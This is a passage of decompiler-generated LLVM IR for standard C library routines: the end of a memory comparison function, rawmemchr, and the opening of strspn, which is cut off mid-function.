  %v3_8066340 = load i32, i32* %v2_8066340, align 4
  br i1 %v9_8066339, label %dec_label_pc_806635f, label %dec_label_pc_806640e.thread

dec_label_pc_806640e.thread:                      ; preds = %dec_label_pc_8066339
  %v4_8066345 = add nuw nsw i32 %v2_8066314, 2
  %v1_806634c = add i32 %v1_806632f, -4
  store i32 %v1_806634c, i32* @edx, align 4
  %v1_806634f = add i32 %v0_8066394, -8
  store i32 %v1_806634f, i32* @ebx, align 4
  %.pre207 = and i32 %v6_806631e, 24
  br label %bb172

dec_label_pc_806635f:                             ; preds = %dec_label_pc_8066339
  %v4_806635f = add nuw nsw i32 %v2_8066314, 1
  %v1_8066365 = add i32 %v0_8066394, -4
  store i32 %v1_8066365, i32* @ebx, align 4
  br label %bb167

dec_label_pc_8066372:                             ; preds = %dec_label_pc_8066337
  %v1_8066372 = add i32 %v1_806632f, 4
  %v2_8066372 = inttoptr i32 %v1_8066372 to i32*
  %v3_8066372 = load i32, i32* %v2_8066372, align 4
  %v1_8066375 = inttoptr i32 %v1_806632f to i32*
  %v2_8066375 = load i32, i32* %v1_8066375, align 4
  store i32 %v1_8066372, i32* @edx, align 4
  %v1_806637e = inttoptr i32 %v0_8066394 to i32*
  %v2_806637e = load i32, i32* %v1_806637e, align 4
  br label %bb162

dec_label_pc_8066382:                             ; preds = %dec_label_pc_8066308
  %v1_8066382 = inttoptr i32 %v1_806632f to i32*
  %v2_8066382 = load i32, i32* %v1_8066382, align 4
  %v1_8066388 = add i32 %v1_806632f, 4
  %v2_8066388 = inttoptr i32 %v1_8066388 to i32*
  %v3_8066388 = load i32, i32* %v2_8066388, align 4
  %v1_806638b = inttoptr i32 %v0_8066394 to i32*
  %v2_806638b = load i32, i32* %v1_806638b, align 4
  %v4_806638d = add nsw i32 %v2_8066314, -1
  %v1_8066391 = add i32 %v1_806632f, 8
  store i32 %v1_8066391, i32* @edx, align 4
  %v1_8066394 = add i32 %v0_8066394, 4
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_8066441, %dec_label_pc_8066382
  %storemerge8.pre = phi i32 [ %v3_806641b, %dec_label_pc_8066441 ], [ %v2_806638b, %dec_label_pc_8066382 ]
  %v0_80663b0 = phi i32 [ %v3_8066418, %dec_label_pc_8066441 ], [ %v3_8066388, %dec_label_pc_8066382 ]
  %v6_8066399 = phi i32 [ %v8_806641e, %dec_label_pc_8066441 ], [ %v0_806632a, %dec_label_pc_8066382 ]
  %v0_8066397 = phi i32 [ %v1_8066441, %dec_label_pc_8066441 ], [ %v1_8066391, %dec_label_pc_8066382 ]
  %v0_80663a7 = phi i32 [ %v1_8066444, %dec_label_pc_8066441 ], [ %v1_8066394, %dec_label_pc_8066382 ]
  %stack_var_-24.0 = phi i32 [ %v4_806643a, %dec_label_pc_8066441 ], [ %v4_806638d, %dec_label_pc_8066382 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.1194, %dec_label_pc_8066441 ], [ %v2_8066382, %dec_label_pc_8066382 ]
  store i32 %v0_80663a7, i32* @ebx, align 4
  %v1_8066397 = inttoptr i32 %v0_8066397 to i32*
  %v2_8066397 = load i32, i32* %v1_8066397, align 4
  %v7_8066399 = and i32 %v6_8066399, -256
  %v5_80663a5 = lshr i32 %stack_var_-36.0, %v2_8066317
  %v1_80663a7 = inttoptr i32 %v0_80663a7 to i32*
  %v2_80663a7 = load i32, i32* %v1_80663a7, align 4
  %v8_80663a9 = or i32 %v7_8066399, %v6_806631e
  %v2_80663b2 = and i32 %v6_806631e, 24
  %v4_80663b2 = icmp eq i32 %v2_80663b2, 0
  br i1 %v4_80663b2, label %bb160, label %bb158

bb158:                                            ; preds = %bb157
  %v5_80663b2 = shl i32 %v0_80663b0, %v2_80663b2
  br label %bb160

bb160:                                            ; preds = %bb157, %bb158
  %v3_80663b4 = phi i32 [ %v0_80663b0, %bb157 ], [ %v5_80663b2, %bb158 ]
  %v4_80663b4 = or i32 %v3_80663b4, %v5_80663a5
  %v14_80663b7 = icmp eq i32 %v4_80663b4, %storemerge8.pre
  br i1 %v14_80663b7, label %bb162, label %dec_label_pc_8066435

bb162:                                            ; preds = %bb160, %dec_label_pc_8066372
  %v1_80663dc = phi i32 [ %v2_80663a7, %bb160 ], [ %v2_806637e, %dec_label_pc_8066372 ]
  %v0_80663d5 = phi i32 [ %v0_80663a7, %bb160 ], [ %v0_8066394, %dec_label_pc_8066372 ]
  %v0_80663c7 = phi i32 [ %v0_80663b0, %bb160 ], [ %v2_8066375, %dec_label_pc_8066372 ]
  %v6_80663c3 = phi i32 [ %v8_80663a9, %bb160 ], [ %v3_8066372, %dec_label_pc_8066372 ]
  %stack_var_-28.0 = phi i32 [ %v2_8066397, %bb160 ], [ %v3_8066372, %dec_label_pc_8066372 ]
  %v0_80663c0 = phi i32 [ %v0_8066397, %bb160 ], [ %v1_8066372, %dec_label_pc_8066372 ]
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %bb160 ], [ %v2_8066314, %dec_label_pc_8066372 ]
  %v1_80663c0 = add i32 %v0_80663c0, 4
  %v2_80663c0 = inttoptr i32 %v1_80663c0 to i32*
  %v3_80663c0 = load i32, i32* %v2_80663c0, align 4
  %v7_80663c3 = and i32 %v6_80663c3, -256
  %v5_80663c7 = lshr i32 %v0_80663c7, %v2_8066317
  %v8_80663cd = or i32 %v7_80663c3, %v6_806631e
  %v1_80663d5 = add i32 %v0_80663d5, 4
  %v2_80663d5 = inttoptr i32 %v1_80663d5 to i32*
  %v3_80663d5 = load i32, i32* %v2_80663d5, align 4
  %v2_80663d8 = and i32 %v6_806631e, 24
  %v4_80663d8 = icmp eq i32 %v2_80663d8, 0
  br i1 %v4_80663d8, label %bb165, label %bb163

bb163:                                            ; preds = %bb162
  %v5_80663d8 = shl i32 %stack_var_-28.0, %v2_80663d8
  br label %bb165

bb165:                                            ; preds = %bb162, %bb163
  %v1_80663da = phi i32 [ %stack_var_-28.0, %bb162 ], [ %v5_80663d8, %bb163 ]
  %v2_80663da = or i32 %v1_80663da, %v5_80663c7
  %v12_80663dc = icmp eq i32 %v2_80663da, %v1_80663dc
  br i1 %v12_80663dc, label %bb167, label %dec_label_pc_806640a

bb167:                                            ; preds = %bb165, %dec_label_pc_806635f
  %storemerge10.pre = phi i32 [ %v3_80663d5, %bb165 ], [ %v2_806633e, %dec_label_pc_806635f ]
  %v0_8066401 = phi i32 [ %v0_80663d5, %bb165 ], [ %v1_8066365, %dec_label_pc_806635f ]
  %v6_80663e7 = phi i32 [ %v8_80663cd, %bb165 ], [ %v2_806633c, %dec_label_pc_806635f ]
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %bb165 ], [ %v2_806633c, %dec_label_pc_806635f ]
  %v0_80663e4 = phi i32 [ %v0_80663c0, %bb165 ], [ %v1_806632f, %dec_label_pc_806635f ]
  %stack_var_-24.2 = phi i32 [ %stack_var_-24.1, %bb165 ], [ %v4_806635f, %dec_label_pc_806635f ]
  %stack_var_-32.0 = phi i32 [ %v3_80663c0, %bb165 ], [ %v3_8066340, %dec_label_pc_806635f ]
  %v1_80663e4 = add i32 %v0_80663e4, 8
  %v2_80663e4 = inttoptr i32 %v1_80663e4 to i32*
  %v3_80663e4 = load i32, i32* %v2_80663e4, align 4
  %v5_80663f3 = lshr i32 %stack_var_-28.1, %v2_8066317
  %v2_80663fd = and i32 %v6_806631e, 24
  %v4_80663fd = icmp eq i32 %v2_80663fd, 0
  br i1 %v4_80663fd, label %bb170, label %bb168

bb168:                                            ; preds = %bb167
  %v5_80663fd = shl i32 %stack_var_-32.0, %v2_80663fd
  br label %bb170

bb170:                                            ; preds = %bb167, %bb168
  %v1_80663ff = phi i32 [ %stack_var_-32.0, %bb167 ], [ %v5_80663fd, %bb168 ]
  %v2_80663ff = or i32 %v1_80663ff, %v5_80663f3
  %v12_8066404 = icmp eq i32 %v2_80663ff, %storemerge10.pre
  br i1 %v12_8066404, label %dec_label_pc_806640e, label %dec_label_pc_806640a

dec_label_pc_806640a:                             ; preds = %bb170, %bb165
  %v0_806640a = phi i32 [ %v2_80663da, %bb165 ], [ %v2_80663ff, %bb170 ]
  %storemerge10 = phi i32 [ %v1_80663dc, %bb165 ], [ %storemerge10.pre, %bb170 ]
  store i32 %storemerge10, i32* @edx, align 4
  store i32 %v0_806640a, i32* @eax, align 4
  br label %dec_label_pc_8066466

dec_label_pc_806640e:                             ; preds = %bb170
  %v1_8066401 = add i32 %v0_8066401, 8
  %v2_8066401 = inttoptr i32 %v1_8066401 to i32*
  %v3_8066401 = load i32, i32* %v2_8066401, align 4
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_806640e.thread, %dec_label_pc_806640e
  %.pre.pre-phi = phi i32 [ %.pre207, %dec_label_pc_806640e.thread ], [ %v2_80663fd, %dec_label_pc_806640e ]
  %stack_var_-32.1193 = phi i32 [ %v2_806633c, %dec_label_pc_806640e.thread ], [ %stack_var_-32.0, %dec_label_pc_806640e ]
  %v7_806640e196.in = phi i32 [ %v2_806633c, %dec_label_pc_806640e.thread ], [ %v6_80663e7, %dec_label_pc_806640e ]
  %stack_var_-36.1194 = phi i32 [ %v3_8066340, %dec_label_pc_806640e.thread ], [ %v3_80663e4, %dec_label_pc_806640e ]
  %stack_var_-24.3191 = phi i32 [ %v4_8066345, %dec_label_pc_806640e.thread ], [ %stack_var_-24.2, %dec_label_pc_806640e ]
  %v0_8066441187 = phi i32 [ %v1_806634c, %dec_label_pc_806640e.thread ], [ %v0_80663e4, %dec_label_pc_806640e ]
  %v0_8066444185 = phi i32 [ %v1_806634f, %dec_label_pc_806640e.thread ], [ %v0_8066401, %dec_label_pc_806640e ]
  %v3_806642e183 = phi i32 [ %v2_806633e, %dec_label_pc_806640e.thread ], [ %v3_8066401, %dec_label_pc_806640e ]
  %v7_806640e196 = and i32 %v7_806640e196.in, -256
  %v5_8066416 = lshr i32 %stack_var_-32.1193, %v2_8066317
  %v1_8066418 = add i32 %v0_8066441187, 12
  %v2_8066418 = inttoptr i32 %v1_8066418 to i32*
  %v3_8066418 = load i32, i32* %v2_8066418, align 4
  %v1_806641b = add i32 %v0_8066444185, 12
  %v2_806641b = inttoptr i32 %v1_806641b to i32*
  %v3_806641b = load i32, i32* %v2_806641b, align 4
  %v8_806641e = or i32 %v7_806640e196, %v6_806631e
  %v4_8066429 = icmp eq i32 %.pre.pre-phi, 0
  br i1 %v4_8066429, label %bb175, label %bb173

bb173:                                            ; preds = %bb172
  %v5_8066429 = shl i32 %stack_var_-36.1194, %.pre.pre-phi
  br label %bb175

bb175:                                            ; preds = %bb172, %bb173
  %v3_806642b = phi i32 [ %stack_var_-36.1194, %bb172 ], [ %v5_8066429, %bb173 ]
  %v4_806642b = or i32 %v3_806642b, %v5_8066416
  %v14_806642e = icmp eq i32 %v4_806642b, %v3_806642e183
  br i1 %v14_806642e, label %dec_label_pc_806643a, label %dec_label_pc_8066435

dec_label_pc_8066435:                             ; preds = %bb160, %bb175
  %v2_8066435 = phi i32 [ %v4_806642b, %bb175 ], [ %v4_80663b4, %bb160 ]
  %storemerge8 = phi i32 [ %v3_806642e183, %bb175 ], [ %storemerge8.pre, %bb160 ]
  store i32 %storemerge8, i32* @edx, align 4
  store i32 %v2_8066435, i32* @eax, align 4
  br label %dec_label_pc_8066466

dec_label_pc_806643a:                             ; preds = %bb175
  %v4_806643a = add i32 %stack_var_-24.3191, -4
  %v12_806643a = icmp eq i32 %v4_806643a, 0
  br i1 %v12_806643a, label %bb177, label %dec_label_pc_8066441

dec_label_pc_8066441:                             ; preds = %dec_label_pc_806643a
  %v1_8066441 = add i32 %v0_8066441187, 16
  store i32 %v1_8066441, i32* @edx, align 4
  %v1_8066444 = add i32 %v0_8066444185, 16
  br label %bb157

bb177:                                            ; preds = %dec_label_pc_806643a
  %v5_8066454 = lshr i32 %stack_var_-36.1194, %v2_8066317
  br i1 %v4_8066429, label %bb180, label %bb178

bb178:                                            ; preds = %bb177
  %v5_806645a = shl i32 %v3_8066418, %.pre.pre-phi
  br label %bb180

bb180:                                            ; preds = %bb177, %bb178
  %v1_806645c = phi i32 [ %v3_8066418, %bb177 ], [ %v5_806645a, %bb178 ]
  %v2_806645c = or i32 %v1_806645c, %v5_8066454
  store i32 %v2_806645c, i32* @eax, align 4
  %v12_8066460 = icmp eq i32 %v2_806645c, %v3_806641b
  br i1 %v12_8066460, label %dec_label_pc_806646f.thread208, label %dec_label_pc_8066464

dec_label_pc_806646f.thread208:                   ; preds = %bb180
  br label %dec_label_pc_8066473

dec_label_pc_8066464:                             ; preds = %bb180
  store i32 %v3_806641b, i32* @edx, align 4
  br label %dec_label_pc_8066466

dec_label_pc_8066466:                             ; preds = %dec_label_pc_8066435, %dec_label_pc_806640a, %dec_label_pc_8066464
  %v0_8066466 = call i32 @memcmp_bytes()
  store i32 %v0_8066466, i32* @ecx, align 4
  br label %dec_label_pc_806646f

dec_label_pc_806646f:                             ; preds = %dec_label_pc_8066466, %dec_label_pc_80662fe
  %storemerge = phi i32 [ %v0_80662fe, %dec_label_pc_80662fe ], [ %v0_8066466, %dec_label_pc_8066466 ]
  %v1_806646f = icmp eq i32 %storemerge, 0
  %v1_8066471 = icmp eq i1 %v1_806646f, false
  br i1 %v1_8066471, label %dec_label_pc_80664a8, label %dec_label_pc_8066473

dec_label_pc_8066473:                             ; preds = %dec_label_pc_806646f.thread208, %dec_label_pc_806646f.thread, %dec_label_pc_806646f
  %v4_806647b = urem i32 %stack_var_12.0.lcssa, 4
  %v1_8066480 = and i32 %stack_var_12.0.lcssa, -4
  %v2_8066487 = add i32 %v1_8066480, %v0_806632a
  store i32 %v2_8066487, i32* @ecx, align 4
  %v2_8066489 = add i32 %v1_8066480, %v0_8066394
  br label %dec_label_pc_806649f.preheader

dec_label_pc_806649f.preheader:                   ; preds = %dec_label_pc_8066473, %entry
  %v0_8066490121 = phi i32 [ %v4_8066212, %entry ], [ %v2_8066487, %dec_label_pc_8066473 ]
  %v0_806648d119 = phi i32 [ %arg2, %entry ], [ %v2_8066489, %dec_label_pc_8066473 ]
  %stack_var_12.1.ph = phi i32 [ %arg3, %entry ], [ %v4_806647b, %dec_label_pc_8066473 ]
  %v4_806649f37 = icmp eq i32 %stack_var_12.1.ph, 0
  %v1_80664a444 = icmp eq i1 %v4_806649f37, false
  br i1 %v1_80664a444, label %dec_label_pc_806648d, label %dec_label_pc_80664a6

dec_label_pc_806648d:                             ; preds = %dec_label_pc_806649f.preheader, %dec_label_pc_8066499
  %v0_806649d = phi i32 [ %v1_806649d, %dec_label_pc_8066499 ], [ %v0_8066490121, %dec_label_pc_806649f.preheader ]
  %v0_806649e = phi i32 [ %v1_806649e, %dec_label_pc_8066499 ], [ %v0_806648d119, %dec_label_pc_806649f.preheader ]
  %stack_var_12.145 = phi i32 [ %v4_8066499, %dec_label_pc_8066499 ], [ %stack_var_12.1.ph, %dec_label_pc_806649f.preheader ]
  %v1_806648d = inttoptr i32 %v0_806649e to i8*
  %v2_806648d = load i8, i8* %v1_806648d, align 1
  %v3_806648d = zext i8 %v2_806648d to i32
  %v1_8066490 = inttoptr i32 %v0_806649d to i8*
  %v2_8066490 = load i8, i8* %v1_8066490, align 1
  %v3_8066490 = zext i8 %v2_8066490 to i32
  %v2_8066493 = sub nsw i32 %v3_8066490, %v3_806648d
  %v12_8066493 = icmp eq i32 %v2_8066493, 0
  store i32 %v2_8066493, i32* @edx, align 4
  %v1_8066497 = icmp eq i1 %v12_8066493, false
  br i1 %v1_8066497, label %dec_label_pc_80664a8, label %dec_label_pc_8066499

dec_label_pc_8066499:                             ; preds = %dec_label_pc_806648d
  %v4_8066499 = add i32 %stack_var_12.145, -1
  %v11_8066499 = icmp eq i32 %v4_8066499, 0
  %v1_806649d = add i32 %v0_806649d, 1
  store i32 %v1_806649d, i32* @ecx, align 4
  %v1_806649e = add i32 %v0_806649e, 1
  %v1_80664a4 = icmp eq i1 %v11_8066499, false
  br i1 %v1_80664a4, label %dec_label_pc_806648d, label %dec_label_pc_80664a6

dec_label_pc_80664a6:                             ; preds = %dec_label_pc_8066499, %dec_label_pc_806649f.preheader
  br label %dec_label_pc_80664a8

dec_label_pc_80664a8:                             ; preds = %dec_label_pc_8066226, %dec_label_pc_806648d, %dec_label_pc_806646f, %dec_label_pc_80664a6
  %v0_80664af = phi i32 [ %storemerge, %dec_label_pc_806646f ], [ 0, %dec_label_pc_80664a6 ], [ %v2_8066493, %dec_label_pc_806648d ], [ %v2_806622c, %dec_label_pc_8066226 ]
  store i32 %v0_806620e, i32* @ebx, align 4
  ret i32 %v0_80664af

; uselistorder directives
  uselistorder i32 %v1_806649d, { 1, 0 }
  uselistorder i32 %v4_8066499, { 1, 0 }
  uselistorder i32 %v1_8066480, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_8066441, { 1, 0 }
  uselistorder i32 %v4_806643a, { 1, 0 }
  uselistorder i32 %v4_806642b, { 1, 0 }
  uselistorder i32 %v3_806641b, { 2, 0, 1 }
  uselistorder i32 %v3_8066418, { 1, 2, 0 }
  uselistorder i32 %v3_806642e183, { 1, 0 }
  uselistorder i32 %v0_8066444185, { 1, 0 }
  uselistorder i32 %v0_8066441187, { 1, 0 }
  uselistorder i32 %stack_var_-36.1194, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80663ff, { 1, 0 }
  uselistorder i32 %storemerge10.pre, { 1, 0 }
  uselistorder i32 %v2_80663da, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i32 %v1_80663dc, { 1, 0 }
  uselistorder i32 %v4_80663b4, { 1, 0 }
  uselistorder i32 %storemerge8.pre, { 1, 0 }
  uselistorder i32 %v3_8066372, { 1, 0 }
  uselistorder i32 %v2_806633c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_806632f, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9 }
  uselistorder i32 %v1_806632c, { 2, 0, 1 }
  uselistorder i32 %v6_806631e, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 %v2_8066317, { 2, 1, 5, 4, 3, 0 }
  uselistorder i32 %v1_80662df, { 1, 0 }
  uselistorder i32 %v3_80662da, { 1, 0, 2 }
  uselistorder i32 %v3_80662cf, { 1, 0, 2 }
  uselistorder i32 %v0_80662d8, { 1, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v0_80662c7, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %storemerge24.in, { 0, 2, 1 }
  uselistorder i32 %v4_80662a7, { 1, 0 }
  uselistorder i32 %v1_806625d, { 2, 0, 1 }
  uselistorder i32 %v2_8066314, { 4, 5, 2, 3, 0, 6, 7, 8, 9, 1 }
  uselistorder i32 %v0_8066394, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32 %stack_var_12.0.lcssa, { 2, 0, 1 }
  uselistorder i32 %v0_806632a, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %v1_806623b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_806623a, { 0, 2, 1 }
  uselistorder i32 %v4_8066212, { 2, 1, 0, 3 }
  uselistorder i32 ()* @memcmp_bytes, { 1, 0 }
  uselistorder i32 -8, { 128, 129, 130, 131, 136, 132, 137, 28, 22, 21, 23, 20, 24, 25, 26, 27, 29, 30, 134, 31, 32, 33, 34, 36, 37, 35, 38, 39, 40, 41, 42, 43, 9, 44, 45, 140, 138, 139, 8, 135, 51, 48, 49, 50, 52, 53, 12, 47, 11, 46, 10, 54, 13, 55, 56, 133, 62, 63, 57, 58, 59, 60, 61, 64, 65, 66, 67, 76, 75, 14, 70, 15, 71, 72, 73, 74, 68, 69, 77, 78, 80, 79, 81, 82, 83, 90, 91, 92, 93, 94, 95, 89, 88, 87, 85, 86, 84, 96, 97, 98, 99, 100, 101, 102, 6, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 16, 118, 117, 17, 0, 1, 2, 3, 119, 120, 121, 4, 5, 18, 122, 19, 123, 124, 125, 7, 126, 127 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80664a8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_806648d, { 1, 0 }
  uselistorder label %dec_label_pc_8066473, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066466, { 2, 0, 1 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_8066435, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %bb170, { 1, 0 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_80662fe, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8066226, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80664b1 = load i32, i32* @ebx, align 4
  %v4_80664b2 = urem i32 %arg2, 256
  %v4_80664b6 = ptrtoint i8* %arg1 to i32
  %v2_80664c13 = urem i32 %v4_80664b6, 4
  %v3_80664c14 = icmp eq i32 %v2_80664c13, 0
  %v1_80664c38 = icmp eq i1 %v3_80664c14, false
  %v4_80664bc = trunc i32 %arg2 to i8
  br i1 %v1_80664c38, label %dec_label_pc_80664bc, label %dec_label_pc_80664c5

dec_label_pc_80664bc:                             ; preds = %entry, %dec_label_pc_80664c0
  %v0_80664c0 = phi i32 [ %v1_80664c0, %dec_label_pc_80664c0 ], [ %v4_80664b6, %entry ]
  %v1_80664bc = inttoptr i32 %v0_80664c0 to i8*
  %v2_80664bc = load i8, i8* %v1_80664bc, align 1
  %v15_80664bc = icmp eq i8 %v2_80664bc, %v4_80664bc
  br i1 %v15_80664bc, label %dec_label_pc_8066510, label %dec_label_pc_80664c0

dec_label_pc_80664c0:                             ; preds = %dec_label_pc_80664bc
  %v1_80664c0 = add i32 %v0_80664c0, 1
  %v2_80664c1 = urem i32 %v1_80664c0, 4
  %v3_80664c1 = icmp eq i32 %v2_80664c1, 0
  %v1_80664c3 = icmp eq i1 %v3_80664c1, false
  br i1 %v1_80664c3, label %dec_label_pc_80664bc, label %dec_label_pc_80664c5

dec_label_pc_80664c5:                             ; preds = %entry, %dec_label_pc_80664c0
  %v0_80664c8 = phi i32 [ %v1_80664c0, %dec_label_pc_80664c0 ], [ %v4_80664b6, %entry ]
  %v2_80664cc = mul nuw nsw i32 %v4_80664b2, 256
  %v2_80664cf = or i32 %v2_80664cc, %v4_80664b2
  %v2_80664d3 = mul i32 %v2_80664cf, 65536
  %v2_80664d6 = or i32 %v2_80664d3, %v2_80664cf
  br label %dec_label_pc_80664d8

dec_label_pc_80664d8:                             ; preds = %dec_label_pc_8066508, %dec_label_pc_80664d8, %dec_label_pc_80664c5
  %v0_80664dc = phi i32 [ %v0_80664c8, %dec_label_pc_80664c5 ], [ %v1_80664dc, %dec_label_pc_80664d8 ], [ %v1_80664dc, %dec_label_pc_8066508 ]
  %v2_80664da = inttoptr i32 %v0_80664dc to i32*
  %v3_80664da = load i32, i32* %v2_80664da, align 4
  %v4_80664da = xor i32 %v3_80664da, %v2_80664d6
  %v1_80664dc = add i32 %v0_80664dc, 4
  store i32 %v1_80664dc, i32* @ecx, align 4
  %v1_80664df = add i32 %v4_80664da, 2130640639
  %v1_80664e5 = sub i32 -1, %v4_80664da
  store i32 %v1_80664e5, i32* @edx, align 4
  %v2_80664e7 = xor i32 %v1_80664df, %v1_80664e5
  %v1_80664e9 = and i32 %v2_80664e7, -2130640640
  %v2_80664e9 = icmp eq i32 %v1_80664e9, 0
  br i1 %v2_80664e9, label %dec_label_pc_80664d8, label %dec_label_pc_80664f0

dec_label_pc_80664f0:                             ; preds = %dec_label_pc_80664d8
  %v2_80664f3 = inttoptr i32 %v0_80664dc to i8*
  %v3_80664f3 = load i8, i8* %v2_80664f3, align 1
  %v16_80664f3 = icmp eq i8 %v3_80664f3, %v4_80664bc
  br i1 %v16_80664f3, label %dec_label_pc_8066510, label %dec_label_pc_80664f8

dec_label_pc_80664f8:                             ; preds = %dec_label_pc_80664f0
  %v1_80664f8 = add i32 %v0_80664dc, 1
  %v2_80664fb = inttoptr i32 %v1_80664f8 to i8*
  %v3_80664fb = load i8, i8* %v2_80664fb, align 1
  %v16_80664fb = icmp eq i8 %v3_80664fb, %v4_80664bc
  br i1 %v16_80664fb, label %dec_label_pc_8066510, label %dec_label_pc_8066500

dec_label_pc_8066500:                             ; preds = %dec_label_pc_80664f8
  %v1_8066500 = add i32 %v0_80664dc, 2
  %v2_8066503 = inttoptr i32 %v1_8066500 to i8*
  %v3_8066503 = load i8, i8* %v2_8066503, align 1
  %v16_8066503 = icmp eq i8 %v3_8066503, %v4_80664bc
  br i1 %v16_8066503, label %dec_label_pc_8066510, label %dec_label_pc_8066508

dec_label_pc_8066508:                             ; preds = %dec_label_pc_8066500
  %v1_8066508 = add i32 %v0_80664dc, 3
  %v2_806650b = inttoptr i32 %v1_8066508 to i8*
  %v3_806650b = load i8, i8* %v2_806650b, align 1
  %v16_806650b = icmp eq i8 %v3_806650b, %v4_80664bc
  %v1_806650e = icmp eq i1 %v16_806650b, false
  br i1 %v1_806650e, label %dec_label_pc_80664d8, label %dec_label_pc_8066510

dec_label_pc_8066510:                             ; preds = %dec_label_pc_80664bc, %dec_label_pc_8066508, %dec_label_pc_8066500, %dec_label_pc_80664f8, %dec_label_pc_80664f0
  %v0_8066512 = phi i32 [ %v1_8066508, %dec_label_pc_8066508 ], [ %v1_8066500, %dec_label_pc_8066500 ], [ %v1_80664f8, %dec_label_pc_80664f8 ], [ %v0_80664dc, %dec_label_pc_80664f0 ], [ %v0_80664c0, %dec_label_pc_80664bc ]
  store i32 %v0_80664b1, i32* @ebx, align 4
  ret i32 %v0_8066512

; uselistorder directives
  uselistorder i32 %v1_80664e5, { 1, 0 }
  uselistorder i32 %v1_80664dc, { 2, 1, 0 }
  uselistorder i32 %v2_80664cf, { 1, 0 }
  uselistorder i32 %v1_80664c0, { 1, 0, 2 }
  uselistorder i8 %v4_80664bc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_80664b6, { 2, 1, 0 }
  uselistorder i32 %v4_80664b2, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8066510, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80664c5, { 1, 0 }
  uselistorder label %dec_label_pc_80664bc, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_806653630 = load i8, i8* %arg1, align 1
  %v4_806653834 = icmp eq i8 %v2_806653630, 0
  br i1 %v4_806653834, label %dec_label_pc_8066540, label %dec_label_pc_806653c.lr.ph

dec_label_pc_806653c.lr.ph:                       ; preds = %entry
  %v3_806653631 = zext i8 %v2_806653630 to i32
  %v4_8066536.pre = load i32, i32* @eax, align 4
  %v5_806653632 = and i32 %v4_8066536.pre, -256
  %v6_806653633 = or i32 %v3_806653631, %v5_806653632
  %v4_806651d = ptrtoint i8* %arg1 to i32
  %v1_806652818 = inttoptr i32 %arg2 to i8*
  %v4_8066528.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_806653c

dec_label_pc_8066523:                             ; preds = %dec_label_pc_806653c, %dec_label_pc_8066527
  %v6_806652827 = phi i32 [ %v6_8066528, %dec_label_pc_8066527 ], [ %v6_806652822, %dec_label_pc_806653c ]
  %v2_806652826 = phi i8 [ %v2_8066528, %dec_label_pc_8066527 ], [ %v2_806652819, %dec_label_pc_806653c ]
  %v0_806652725 = phi i32 [ %v1_8066527, %dec_label_pc_8066527 ], [ %arg2, %dec_label_pc_806653c ]
  %v15_8066523 = icmp eq i8 %v2_806653637, %v2_806652826
  br i1 %v15_8066523, label %dec_label_pc_8066530, label %dec_label_pc_8066527

dec_label_pc_8066527:                             ; preds = %dec_label_pc_8066523
  %v1_8066527 = add i32 %v0_806652725, 1
  store i32 %v1_8066527, i32* @edx, align 4
  %v1_8066528 = inttoptr i32 %v1_8066527 to i8*
  %v2_8066528 = load i8, i8* %v1_8066528, align 1
  %v3_8066528 = zext i8 %v2_8066528 to i32
  %v5_8066528 = and i32 %v6_806652827, -256
  %v6_8066528 = or i32 %v3_8066528, %v5_8066528
  store i32 %v6_8066528, i32* @ecx, align 4
  %v4_806652a = icmp eq i8 %v2_8066528, 0
  %v1_806652c = icmp eq i1 %v4_806652a, false
  br i1 %v1_806652c, label %dec_label_pc_8066523, label %dec_label_pc_8066540

dec_label_pc_8066530:                             ; preds = %dec_label_pc_8066523
  %v1_8066534 = add i32 %v0_806654035, 1
  %v1_8066535 = add i32 %v0_806653536, 1
  %v1_8066536 = inttoptr i32 %v1_8066535 to i8*
  %v2_8066536 = load i8, i8* %v1_8066536, align 1
  %v3_8066536 = zext i8 %v2_8066536 to i32
  %v5_8066536 = and i32 %v6_806653638, -256
  %v6_8066536 = or i32 %v3_8066536, %v5_8066536
  %v4_8066538 = icmp eq i8 %v2_8066536, 0
  br i1 %v4_8066538, label %dec_label_pc_8066540, label %dec_label_pc_806653c

dec_label_pc_806653c:                             ; preds = %dec_label_pc_806653c.lr.ph, %dec_label_pc_8066530
  %v4_8066528.pre = phi i32 [ %v4_8066528.pre.pre, %dec_label_pc_806653c.lr.ph ], [ %v6_806652827, %dec_label_pc_8066530 ]
